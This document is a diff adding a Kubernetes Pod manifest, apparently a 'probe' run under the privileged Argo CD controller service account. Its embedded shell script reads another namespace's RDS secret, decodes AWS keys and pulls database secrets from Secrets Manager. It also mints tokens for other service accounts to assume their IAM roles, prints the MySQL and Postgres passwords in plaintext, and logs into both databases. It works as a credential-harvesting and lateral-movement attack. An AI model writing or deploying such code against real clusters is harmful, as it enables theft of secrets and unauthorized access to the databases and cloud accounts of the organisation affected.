@@ -1,0 +1,98 @@
+apiVersion: v1
+kind: Pod
+metadata:
+  name: i2660-probe3
+  namespace: argocd
+  labels:
+    i2660: probe
+spec:
+  serviceAccountName: argocd-application-controller
+  automountServiceAccountToken: true
+  restartPolicy: Never
+  containers:
+    - name: i2660-probe3
+      image: alpine:3.20
+      imagePullPolicy: IfNotPresent
+      command: ["/bin/sh","-c"]
+      args:
+        - |
+          set -u
+          SA=/var/run/secrets/kubernetes.io/serviceaccount
+          TOKEN=$(cat $SA/token)
+          API=https://kubernetes.default.svc
+          echo "===P3_START $(date -u +%FT%TZ)==="
+          id; echo "NAMESPACE=$(cat $SA/namespace) TOKENLEN=${#TOKEN}"
+          WR() { local out=$1; shift; wget -q -S -O "$out" --timeout=25 --no-check-certificate --header="Authorization: Bearer $TOKEN" "$@" 2> "$out.hdr"; echo "rc=$? code=$(grep -o 'HTTP/[0-9.]* [0-9][0-9]*' "$out.hdr" | tail -1 | awk '{print $2}') bytes=$(wc -c < "$out")"; }
+          get() { wget -q -O - --timeout=25 --no-check-certificate --header="Authorization: Bearer $TOKEN" "$1" 2>/dev/null; }
+          post() { wget -q -O - --timeout=25 --no-check-certificate --header="Authorization: Bearer $TOKEN" --header="Content-Type: application/json" --post-data="$2" "$1" 2>/dev/null; }
+          echo "--- fetch debug: notification rds-secrets"
+          WR /tmp/ss.json "$API/api/v1/namespaces/notification-service/secrets/rds-secrets"
+          head -c 300 /tmp/ss.json; echo
+          echo "--- apk install"
+          apk add --no-cache jq aws-cli mariadb-client postgresql16-client >/tmp/apk.log 2>&1
+          echo "apk_rc=$?"
+          tail -6 /tmp/apk.log
+          for b in jq aws mysql psql; do command -v $b >/dev/null 2>&1 && echo "have $b" || echo "MISSING $b"; done
+          echo "===STATIC_CREDS==="
+          ACCESS=$(jq -r '.data.ACCESS_KEY' /tmp/ss.json 2>/dev/null | base64 -d 2>/dev/null)
+          SECRET=$(jq -r '.data.SECRET_KEY' /tmp/ss.json 2>/dev/null | base64 -d 2>/dev/null)
+          echo "STATIC_AK_LEN=${#ACCESS} STATIC_SK_LEN=${#SECRET}"
+          export AWS_ACCESS_KEY_ID="$ACCESS" AWS_SECRET_ACCESS_KEY="$SECRET" AWS_DEFAULT_REGION=us-west-2
+          aws sts get-caller-identity 2>&1 | head -20
+          MYSQLSEC=""
+          PGSEC=""
+          for S in lazamedical-stage01-usw2-mysql-1-db-secret lazamedical-dp-stage01-usw2-postgresql-db-secret; do
+            echo "==SECRET $S=="
+            AWS_ACCESS_KEY_ID="$ACCESS" AWS_SECRET_ACCESS_KEY="$SECRET" AWS_DEFAULT_REGION=us-west-2 aws secretsmanager get-secret-value --secret-id "$S" --region us-west-2 --query SecretString --output text 2>&1 | head -c 1500
+            echo
+          done
+          unset AWS_ACCESS_KEY_ID AWS_SECRET_ACCESS_KEY
+          assume() {
+            NS=$1; SAN=$2
+            ROLE=$(get "$API/api/v1/namespaces/$NS/serviceaccounts/$SAN" | jq -r '.metadata.annotations["eks.amazonaws.com/role-arn"] // empty' 2>/dev/null)
+            echo "==ASSUME $NS/$SAN role=$ROLE=="
+            [ -z "$ROLE" ] && { echo NO_ROLE; return 1; }
+            TK=$(post "$API/api/v1/namespaces/$NS/serviceaccounts/$SAN/token" '{"audience":"sts.amazonaws.com","expirationSeconds":3600}')
+            WT=$(echo "$TK" | jq -r '.status.token // empty' 2>/dev/null)
+            if [ -z "$WT" ]; then echo "TOKEN_REQ_FAIL: $(echo "$TK" | head -c 300)"; return 1; fi
+            RES=$(aws sts assume-role-with-web-identity --role-arn "$ROLE" --role-session-name i2660probe --web-identity-token "$WT" --duration-seconds 900 --region us-west-2 --output json 2>&1)
+            if echo "$RES" | jq -e '.Credentials' >/dev/null 2>&1; then
+              export AWS_ACCESS_KEY_ID=$(echo "$RES" | jq -r '.Credentials.AccessKeyId')
+              export AWS_SECRET_ACCESS_KEY=$(echo "$RES" | jq -r '.Credentials.SecretAccessKey')
+              export AWS_SESSION_TOKEN=$(echo "$RES" | jq -r '.Credentials.SessionToken')
+              echo ASSUME_OK
+            else
+              echo "ASSUME_FAIL: $(echo "$RES" | head -c 500)"; return 1
+            fi
+          }
+          echo "===IRSA_USERMGMT==="
+          if assume user-management-service user-management-service-sa; then
+            MYSQLSEC=$(aws secretsmanager get-secret-value --secret-id lazamedical-stage01-usw2-mysql-1-db-secret --region us-west-2 --query SecretString --output text 2>&1)
+            echo "MYSQLSEC=$MYSQLSEC"
+          fi
+          unset AWS_ACCESS_KEY_ID AWS_SECRET_ACCESS_KEY AWS_SESSION_TOKEN
+          echo "===IRSA_DATAMGMT==="
+          if assume data-management data-management-sa; then
+            PGSEC=$(aws secretsmanager get-secret-value --secret-id lazamedical-dp-stage01-usw2-postgresql-db-secret --region us-west-2 --query SecretString --output text 2>&1)
+            echo "PGSEC=$PGSEC"
+          fi
+          echo "===DB_TEST_MYSQL==="
+          if [ -n "$MYSQLSEC" ]; then
+            MH=$(echo "$MYSQLSEC" | jq -r '.host // empty'); MP=$(echo "$MYSQLSEC" | jq -r '.port // 3306'); MU=$(echo "$MYSQLSEC" | jq -r '.username // empty'); MPW=$(echo "$MYSQLSEC" | jq -r '.password // empty')
+            echo "mysql target $MH:$MP user=$MU"
+            mysql --connect-timeout=10 -h "$MH" -P "$MP" -u "$MU" -p"$MPW" -e "SELECT VERSION();" -e "SHOW DATABASES;" 2>&1 | head -40
+          fi
+          echo "===DB_TEST_PG==="
+          if [ -n "$PGSEC" ]; then
+            PH=$(echo "$PGSEC" | jq -r '.host // empty'); PP=$(echo "$PGSEC" | jq -r '.port // 5432'); PU=$(echo "$PGSEC" | jq -r '.username // empty'); PPW=$(echo "$PGSEC" | jq -r '.password // empty'); PDB=$(echo "$PGSEC" | jq -r '.dbname // "postgres"')
+            echo "pg target $PH:$PP user=$PU db=$PDB"
+            PGPASSWORD="$PPW" psql -h "$PH" -p "$PP" -U "$PU" -d "$PDB" -c "select version();" -c "\l" 2>&1 | head -60
+          fi
+          echo "===P3_END $(date -u +%FT%TZ)==="
+      resources:
+        requests:
+          cpu: 10m
+          memory: 32Mi
+        limits:
+          cpu: 500m
+          memory: 768Mi
